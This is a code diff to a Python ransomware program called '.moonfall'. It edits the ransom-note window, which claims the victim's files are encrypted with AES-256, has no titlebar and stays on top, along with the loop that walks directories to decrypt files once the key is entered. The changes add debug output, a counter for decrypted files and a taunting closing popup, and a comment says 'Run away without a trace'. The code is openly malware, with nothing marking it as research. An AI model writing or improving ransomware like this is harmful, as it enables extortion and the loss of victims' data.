@@ -1,7 +1,6 @@
 import os
 from cryptography.fernet import Fernet
 import PySimpleGUI as sg
-import base64
 
 brand_name = '.moonfall'
 
@@ -30,6 +29,7 @@ def decrypt(filename, key):
 
 
 if __name__ == '__main__':
+	
 	# RANSOM NOTE
 	sg.theme('DarkRed2')   
 	layout = [	[sg.Text('Attention your files have been encrypted under a strong\n encryption algorithm called AES-256', font='Helvetica 18')],
@@ -46,12 +46,16 @@ if __name__ == '__main__':
 	            [sg.Text('')],
 	            [sg.Button('Decrypt files')] ]
 
-	window = sg.Window(layout, no_titlebar=True, keep_on_top=True, element_justification='c')
-	
+	window = sg.Window('Title', layout, no_titlebar=True, keep_on_top=True, element_justification='c')
+
+	count = 0
+
 	while True:
 		try:
 			event, values = window.read()
 			key = values[0]
+			print(event)
+			print(values)
 			# Check the key it's correct
 			# Decrypt
 			# Run away without a trace
@@ -66,14 +70,17 @@ if __name__ == '__main__':
 					full_path = root + os.sep + fn
 					try:
 						decrypt(full_path, key)
+						count += 1
 					except Exception as e:
+						print(e)
 						break
-
-			break
+			if count > 0: break
 		except Exception as e:
 			print(e)
-
-	print("All data was decrypted successfully. Be careful on the internet next time.")
+	
 	window.close()
+
+	sg.theme('DarkPurple5')
+	sg.Popup("All data was decrypted successfully. Be careful on the internet next time ;)", keep_on_top=True, no_titlebar=True)
 
 	      
